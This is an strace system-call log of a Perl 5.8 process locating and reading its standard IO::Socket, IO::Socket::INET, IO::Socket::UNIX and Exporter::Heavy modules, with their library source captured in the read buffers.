7444  07:18:47.767987 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
7444  07:18:47.768493 _llseek(6, 6698, [6698], SEEK_SET) = 0
7444  07:18:47.768510 _llseek(6, 0, [6698], SEEK_CUR) = 0
7444  07:18:47.768521 close(6)          = 0
7444  07:18:47.768540 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.768558 stat64("/etc/perl/IO/Socket/INET.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.768572 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.768585 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.768599 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.768612 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.768626 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.768638 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.768652 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.768664 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.768677 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.768690 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
7444  07:18:47.768711 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
7444  07:18:47.768726 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d1d8) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.768737 _llseek(6, 0, [0], SEEK_CUR) = 0
7444  07:18:47.768891 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
7444  07:18:47.769501 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769622 stat64("/etc/perl/Exporter/Heavy.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769682 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769719 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769789 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769827 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769842 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769853 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769867 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769879 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769892 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769905 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769918 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.769931 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
7444  07:18:47.769952 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.769967 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.769978 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.769996 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
7444  07:18:47.770694 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
7444  07:18:47.770947 brk(0x829c000)    = 0x829c000
7444  07:18:47.771195 read(8, "", 4096) = 0
7444  07:18:47.771210 close(8)          = 0
7444  07:18:47.772484 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
7444  07:18:47.772906 _llseek(6, 6496, [6496], SEEK_SET) = 0
7444  07:18:47.772923 _llseek(6, 0, [6496], SEEK_CUR) = 0
7444  07:18:47.772933 close(6)          = 0
7444  07:18:47.772993 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.773008 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.773022 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.773036 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.773050 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.773062 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.773076 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.773089 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.773102 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.773114 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.773128 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.773141 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
7444  07:18:47.773162 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
7444  07:18:47.773177 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d1d8) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.773188 _llseek(6, 0, [0], SEEK_CUR) = 0
7444  07:18:47.773203 brk(0x82bd000)    = 0x82bd000
7444  07:18:47.773219 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
7444  07:18:47.774194 _llseek(6, 1386, [1386], SEEK_SET) = 0
7444  07:18:47.774211 _llseek(6, 0, [1386], SEEK_CUR) = 0
7444  07:18:47.774222 close(6)          = 0
7444  07:18:47.774276 stat64("/etc/perl/IO/Dir.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.774301 stat64("/etc/perl/IO/Dir.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.774345 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.774359 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.774389 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.774421 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.774435 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.774446 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.774459 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.774471 stat64("/usr/share/perl5/IO/Dir.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.774483 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.774496 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
7444  07:18:47.774516 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
